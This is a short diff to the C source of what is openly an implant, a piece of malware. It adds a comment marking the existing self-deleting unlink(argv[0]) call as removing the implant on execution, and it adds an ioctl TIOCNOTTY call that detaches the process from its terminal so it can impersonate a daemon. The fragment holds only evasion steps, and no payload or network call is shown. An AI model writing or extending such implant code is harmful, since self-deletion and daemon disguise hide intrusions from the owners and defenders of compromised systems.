@@ -3,6 +3,7 @@
 #include <unistd.h>
 #include <string.h>
 #include <sys/prctl.h>
+#include <sys/ioctl.h>
 #include "../include/implant.h"
 
 int main(int argc, char **argv) {
@@ -13,7 +14,11 @@ int main(int argc, char **argv) {
 
     char *target = malloc(strlen(argv[1]) + 1);
 
+    // remove implant upon execution
     unlink(argv[0]);
+
+    // detach from tty to impersonate a daemon
+    ioctl(0, TIOCNOTTY);
 
     // save the arg for later
     strncpy(target, argv[1], strlen(argv[1]) + 1);
